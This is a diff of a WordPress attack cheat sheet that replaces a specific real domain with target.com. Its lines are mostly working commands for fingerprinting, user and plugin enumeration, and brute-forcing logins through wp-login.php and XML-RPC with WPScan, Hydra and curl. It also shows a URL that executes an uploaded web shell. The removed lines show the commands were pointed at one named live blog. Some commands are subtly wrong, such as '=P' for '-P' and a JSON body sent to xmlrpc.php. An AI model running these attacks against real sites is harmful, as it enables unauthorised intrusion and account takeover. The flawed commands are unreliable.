@@ -22,11 +22,11 @@ Check Page source :
 
 ```bash
 ## META generator
-curl -s https://blog.onevasco.com/ | grep -i generator
+curl -s https://target.com/ | grep -i generator
 
 ## CSS/JS version fingerprint (lebih akurat)
-curl -s https://blog.onevasco.com/ | grep -oP 'ver=[0-9.]+' | head
-curl -s https://blog.onevasco.com/ | grep wp-includes
+curl -s https://target.com/ | grep -oP 'ver=[0-9.]+' | head
+curl -s https://target.com/ | grep wp-includes
 ```
 
 Check :
@@ -40,7 +40,7 @@ Check :
 **WPScan :**
 
 ```bash
-wpscan --url https://blog.onevasco.com --enumerate ap
+wpscan --url https://target.com --enumerate ap
 ```
 
 ### 1.3 ENUMERATE REST API
@@ -67,7 +67,7 @@ REST API Version = Wordpress version = CMS Fingerprinting.
 **Dirsearch :**
 
 ```bash
-dirsearch -u https://blog.onevasco.com -e php,txt,zip,html -t 60
+dirsearch -u https://target.com -e php,txt,zip,html -t 60
 ```
 
 **ffuf :**
@@ -95,7 +95,7 @@ Important directories :
 **WPScan user enumeration :**
 
 ```bash
-wpscan --url https://blog.onevasco.com --enumerate u
+wpscan --url https://target.com --enumerate u
 ```
 
 Manual enumeration :
@@ -118,7 +118,7 @@ Plugin are the No.1 vulnerability source.
 **WPScan :**
 
 ```bash
-wpscan --url https://blog.onevasco.com --enumerate ap
+wpscan --url https://target.com --enumerate ap
 ```
 
 Manual :
@@ -164,7 +164,7 @@ Check woth curl :
 curl -d "<methodCall>
 <methodName>system.listMethods</methodName>
 <params></params>
-</methodCall>" https://blog.onevasco.com/xmlrpc.php
+</methodCall>" https://target.com/xmlrpc.php
 ```
 
 
@@ -192,19 +192,19 @@ wp-paths.txt
 **Enumerate everything :**
 
 ```bash
-wpscan --url https://blog.onevasco.com --enumerate u,p,t,cb,dbe
+wpscan --url https://target.com --enumerate u,p,t,cb,dbe
 ```
 
 **Use API for vulnerability detection :**
 
 ```bash
-wpscan --url https://blog.onevasco.com --api-token <YOUr_TOKEN>
+wpscan --url https://target.com --api-token <YOUr_TOKEN>
 ```
 
 **Skip passive detection & go aggresive**
 
 ```bash
-wpscan --url https://blog.onevasco.com --plugins-detection aggresive
+wpscan --url https://target.com --plugins-detection aggresive
 ```
 
 ## 3. WORDPRESS BRUTEFORCE ATTACKS
@@ -214,7 +214,7 @@ wpscan --url https://blog.onevasco.com --plugins-detection aggresive
 **WPScan bruteforce :**
 
 ```bash
-wpscan --url https://blog.onevasco.com -U users.txt =P rockyou.txt
+wpscan --url https://target.com -U users.txt =P rockyou.txt
 ```
 
 **Hydra :**
@@ -226,7 +226,7 @@ hydra -L users.txt -P password.txt target.com http-post-form "/wp-login.php:log=
 **cURL brute :**
 
 ```bash
-curl -d "log=admin&pwd=pasword123" https://blog.onevasco.com/wp-login.php
+curl -d "log=admin&pwd=pasword123" https://target.com/wp-login.php
 ```
 
 ### 3.2 XML-RPC Bruteforce (More Dangerous)
@@ -240,13 +240,13 @@ curl -d '{
 "methodCall":{
 "methodName":"wp.getUsersBlogs",
 "params":[{"username":"admin","password":"123"}]
-}}'  https://blog.onevasco.com/xmlrpc.php
+}}'  https://target.com/xmlrpc.php
 ```
 
 Bruteforce with WPScan :
 
 ```bash
-wpscan --url https://blog.onevasco.com -P rockyou.txt -U admin --password-attack xmlrpc
+wpscan --url https://target.com -P rockyou.txt -U admin --password-attack xmlrpc
 ```
 
 
@@ -292,7 +292,7 @@ Upload :
 
 Execute :
 
-`https://blog.onevasco.com/wp-content/uploads/.../shell.php?cmd=id`
+`https://target.com/wp-content/uploads/.../shell.php?cmd=id`
 
 
 ### 4.2 Wordpress RCE Exploits
